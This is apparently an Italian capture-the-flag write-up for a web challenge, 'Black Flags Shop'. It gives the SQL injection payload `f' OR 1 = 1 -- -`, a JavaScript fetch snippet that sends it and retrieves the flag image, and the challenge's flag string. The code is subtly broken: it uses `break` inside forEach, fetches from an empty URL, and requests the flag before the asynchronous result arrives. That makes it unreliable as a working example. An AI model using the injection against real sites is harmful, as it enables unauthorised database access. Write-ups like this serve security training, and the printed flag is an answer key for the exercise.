# Black Flags Shop

## Descrizione

Una semplice sql injection, nella barra di ricerca basta scrivere `f' OR 1 = 1 -- -` per ricevere tutti i nomi delle immagini a questo punto bastare fare una richiesta al server per ricevere quell' immagine e il gioco è fatto

```javascript

let flag = "";

fetch( '', {
    method: "POST",
    body: "f' OR 1 = 1 -- -"
})
.then( (response) => {
    return response.json();
})
.then( (data) =>  {
    data.forEach( (element) => {
        if ( element.nome === "Flag" ) {
            flag = element.immagine;
            break;
        }
    });
});

fetch( '/static_source' + flag );


```

## Flag

`flag{S3c0nd0_m3_QQu4__ce_qu41c0s4_d1_57r4n0}`

## Autore
`sDibuon`